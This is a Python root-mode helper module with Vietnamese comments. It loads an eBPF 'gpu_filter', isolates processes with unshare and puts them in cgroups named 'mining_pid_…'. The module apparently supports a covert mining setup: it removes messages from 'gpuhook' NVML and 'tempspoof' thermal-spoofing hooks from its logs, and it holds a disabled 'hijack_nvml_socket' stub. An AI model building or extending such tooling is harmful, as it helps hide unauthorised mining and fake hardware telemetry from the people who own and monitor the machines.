#!/usr/bin/env python3
"""
Privileged Operations Manager - ROOT MODE
Quản lý các thao tác privileged khi chạy với quyền root
"""

import os
import subprocess
import logging
from typing import List, Optional, Dict, Any
from pathlib import Path
import time
from functools import wraps
import threading
import shutil

def retry_on_failure(max_retries: int = 3, delay: float = 1.0):
    """
    Decorator để retry operations khi thất bại
    """
    def decorator(func):
        @wraps(func)
        def wrapper(self, *args, **kwargs):
            last_error = None
            for attempt in range(max_retries):
                try:
                    return func(self, *args, **kwargs)
                except Exception as e:
                    last_error = e
                    if attempt < max_retries - 1:
                        self.logger.warning(f"Attempt {attempt + 1} failed for {func.__name__}: {e}")
                        time.sleep(delay * (attempt + 1))  # Exponential backoff
                    else:
                        self.logger.error(f"All {max_retries} attempts failed for {func.__name__}: {e}")
            if last_error:
                raise last_error
            else:
                raise RuntimeError(f"Failed to execute {func.__name__}")
        return wrapper
    return decorator

class PrivilegedOperationManager:
    """
    Manager cho các operations privileged - ROOT MODE
    Simplified version vì chạy với quyền root
    """
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls, logger: Optional[logging.Logger] = None):
        if cls._instance is None:
            with cls._lock:
                # **Double-check locking pattern** (mẫu khóa kiểm tra kép)
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self, logger: Optional[logging.Logger] = None):
        # Chỉ init một lần
        if hasattr(self, '_initialized'):
            return
            
        self._initialized = True
        self.logger = logger or logging.getLogger(__name__)
        self.current_user = os.getenv('USER', 'root')
        self.is_root = os.getuid() == 0
        
        # Cache cho các operations
        self._gpu_info_cache = None
        self._gpu_info_cache_time = 0
        self._cache_ttl = 300  # 5 minutes
        
        if not self.is_root:
            self.logger.warning("⚠️ Not running as root - some operations may fail")
        else:
            self.logger.info("🔑 Running as root - all privileged operations available")
        
    def _run_command(self, command: List[str], check: bool = True) -> subprocess.CompletedProcess:
        """
        Chạy command trực tiếp (vì đã là root)
        """
        self.logger.debug(f"[ROOT] Running: {' '.join(command)}")
        
        # Clone current env nhưng tạm thời gỡ bỏ LD_PRELOAD để tránh gpuhook can thiệp vào các tiện ích hệ thống
        env = os.environ.copy()
        if env.get("KEEP_HOOKS_IN_PRIV_CMDS", "0") != "1":
            env.pop("LD_PRELOAD", None)

        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            env=env,
            check=check
        )

        # Loại bỏ thông điệp hook nếu vẫn còn trong stderr để log sạch hơn
        cleaned_stderr = (result.stderr or "").replace("[gpuhook] NVML hook installed.", "").replace("[tempspoof] Thermal spoof hook active", "").strip()
        cleaned_stdout = (result.stdout or "").strip()
        
        if result.returncode != 0:
            self.logger.error(f"[ROOT] Command failed: {cleaned_stderr}")
        else:
            if cleaned_stdout:
                self.logger.debug(f"[ROOT] Success: {cleaned_stdout[:200]}...")
            
        return result
    
    @retry_on_failure(max_retries=3, delay=1.0)
    def load_ebpf_program(self, bpf_obj_path: str) -> bool:
        """
        Load eBPF program vào kernel
        """
        try:
            # 1) Kiểm tra file object tồn tại
            if not Path(bpf_obj_path).exists():
                self.logger.warning(f"eBPF object not found: {bpf_obj_path}")
                return False

            # 2) Đảm bảo bpftool có trong PATH
            if shutil.which("bpftool") is None:
                self.logger.warning("bpftool không tìm thấy trong PATH – bỏ qua load eBPF (mock mode)")
                return False

            # 3) Đảm bảo bpffs đã được mount
            if not os.path.ismount("/sys/fs/bpf"):
                self.logger.debug("/sys/fs/bpf chưa được mount – thử mount bpffs")
                mount_res = self._run_command(["mount", "-t", "bpf", "bpf", "/sys/fs/bpf"], check=False)
                if mount_res.returncode != 0 and mount_res.stderr.strip():
                    self.logger.warning(f"Không thể mount bpffs: {mount_res.stderr.strip()} – chạy mock mode")
                    return False

            # 4) Thực thi lệnh load; nếu path pin đã tồn tại thì coi như thành công
            result = self._run_command([
                "bpftool", "prog", "load", bpf_obj_path, "/sys/fs/bpf/gpu_filter"
            ], check=False)

            if result.returncode == 0:
                return True

            # Nếu lỗi do path đã tồn tại, vẫn coi là thành công (đã được load trước đó)
            if "File exists" in (result.stderr or ""):
                self.logger.info("eBPF filter đã được load từ trước – bỏ qua")
                return True

            return False
            
        except Exception as e:
            self.logger.error(f"Failed to load eBPF program: {e}")
            return False
    
    def create_namespace_isolation(self, command: List[str]) -> subprocess.Popen:
        """
        Tạo namespace isolation cho command
        """
        try:
            # Unshare network và mount namespaces
            full_cmd = [
                "unshare", "-p", "-m", "-n", "--fork", "--mount-proc"
            ] + command
            
            process = subprocess.Popen(
                full_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            self.logger.info(f"Created isolated process with PID: {process.pid}")
            return process
            
        except Exception as e:
            self.logger.error(f"Failed to create namespace isolation: {e}")
            raise
    
    @retry_on_failure(max_retries=1, delay=0.1)
    def set_gpu_clock_limits(self, gpu_id: int, sm_clock: int, mem_clock: int) -> bool:
        """
        (CPU-only) Vô hiệu hoá: trả về False để báo không hỗ trợ.
        """
        self.logger.debug("set_gpu_clock_limits disabled in CPU-only build")
        return False
    
    def _set_gpu_clocks_sysfs(self, gpu_id: int, sm_clock: int, mem_clock: int) -> bool:
        """
        (CPU-only) Vô hiệu hoá: trả về False để báo không hỗ trợ.
        """
        self.logger.debug("_set_gpu_clocks_sysfs disabled in CPU-only build")
        return False
    
    @retry_on_failure(max_retries=3, delay=1.0)
    def hijack_nvml_socket(self, socket_path: str = "/var/run/nvidia-persistenced/socket") -> bool:
        """
        (CPU-only) Vô hiệu hoá: không thao tác NVML.
        """
        self.logger.debug("hijack_nvml_socket disabled in CPU-only build")
        return False
    
    @retry_on_failure(max_retries=2, delay=0.5)
    def setup_cgroup_limits(self, pid: int, cpu_limit: str, memory_limit: str) -> bool:
        """
        Thiết lập cgroup limits cho process
        """
        try:
            cgroup_name = f"mining_pid_{pid}"
            cgroup_path = f"/sys/fs/cgroup/mining/{cgroup_name}"
            
            # Tạo cgroup
            Path(cgroup_path).mkdir(parents=True, exist_ok=True)
            
            # **[Set CPU limit]** (đặt giới hạn CPU – tài nguyên xử lý)
            if cpu_limit:
                with open(f"{cgroup_path}/cpu.cfs_quota_us", "w") as f:
                    f.write(cpu_limit)
            
            # **[Set memory limit]** (đặt giới hạn memory – bộ nhớ hệ thống)
            if memory_limit:
                with open(f"{cgroup_path}/memory.limit_in_bytes", "w") as f:
                    f.write(memory_limit)
            
            # **[Add process to cgroup]** (thêm tiến trình vào cgroup – nhóm điều khiển)
            with open(f"{cgroup_path}/cgroup.procs", "w") as f:
                f.write(str(pid))
                
            self.logger.info(f"Cgroup limits set for PID {pid}: CPU={cpu_limit}, MEM={memory_limit}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to setup cgroup limits: {e}")
            return False
    
    def check_gpu_access(self) -> Dict[str, Any]:
        """
        (CPU-only) Trả về thông tin GPU mặc định (không khả dụng).
        """
        access_info = {
            "nvidia_smi_available": False,
            "gpu_count": 0,
            "device_nodes": [],
            "render_nodes": [],
            "driver_version": None
        }
        return access_info
    
    def validate_security_context(self) -> Dict[str, Any]:
        """
        Validate security context và permissions
        """
        context = {
            "user": self.current_user,
            "uid": os.getuid(),
            "gid": os.getgid(),
            "is_root": self.is_root,
            "groups": [],
            "capabilities": [],
            "container_runtime": self._detect_container_runtime()
        }
        
        try:
            # Lấy groups
            import grp
            groups = [grp.getgrgid(gid).gr_name for gid in os.getgroups()]
            context["groups"] = groups
            
            # Kiểm tra capabilities (nếu có capsh)
            result = subprocess.run(["capsh", "--print"], 
                                  capture_output=True, text=True, check=False)
            if result.returncode == 0:
                context["capabilities"] = result.stdout.split('\n')
                
        except Exception as e:
            self.logger.error(f"Security context validation failed: {e}")
            
        return context
    
    def _detect_container_runtime(self) -> str:
        """
        Phát hiện container runtime (Docker, Podman, etc.)
        """
        try:
            if Path("/.dockerenv").exists():
                return "docker"
            
            with open("/proc/1/cgroup", "r") as f:
                content = f.read()
                if "docker" in content:
                    return "docker"
                elif "podman" in content:
                    return "podman"
                elif "containerd" in content:
                    return "containerd"
                    
            return "unknown"
        except:
            return "unknown"


def get_privileged_manager(logger: Optional[logging.Logger] = None) -> PrivilegedOperationManager:
    """
    Factory function để tạo PrivilegedOperationManager
    """
    return PrivilegedOperationManager(logger)


if __name__ == "__main__":
    # **[Test script]** (kịch bản kiểm tra chức năng)
    import logging
    logging.basicConfig(level=logging.INFO)
    
    manager = get_privileged_manager()
    
    print("=== Security Context ===")
    context = manager.validate_security_context()
    for key, value in context.items():
        print(f"{key}: {value}")
    
    print("\n=== GPU Access ===")
    gpu_info = manager.check_gpu_access()
    for key, value in gpu_info.items():
        print(f"{key}: {value}") 